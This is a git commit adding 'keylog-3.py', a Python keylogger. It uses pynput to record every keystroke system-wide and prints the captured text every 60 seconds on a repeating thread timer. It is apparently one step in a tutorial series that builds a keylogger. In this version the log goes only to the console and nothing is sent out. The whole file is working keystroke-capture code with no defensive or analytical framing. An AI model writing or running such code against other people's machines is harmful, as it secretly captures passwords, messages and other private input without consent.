97666948bde674cb2c90ef0b6378fa2445ebd61c
Syaiful Irfan <syfanx@gmail.com>
2021-05-19 23:57:58 +0800

    keylog-3 code file

---
+++ keylog-3.py
@@ -0,0 +1,36 @@
+# encoding=utf8
+import pynput.keyboard
+import threading
+# for multi-threading
+
+log = ""
+
+
+def process_key_press(key):
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " " + str(key) + " "
+
+
+def report():
+    global log
+    print(log)
+    log = ""
+    
+
+    timer = threading.Timer(60, report)
+    
+    
+    timer.start()
+    # timer will start
+
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
+with keyboard_listener:
+    report()
+    keyboard_listener.join()
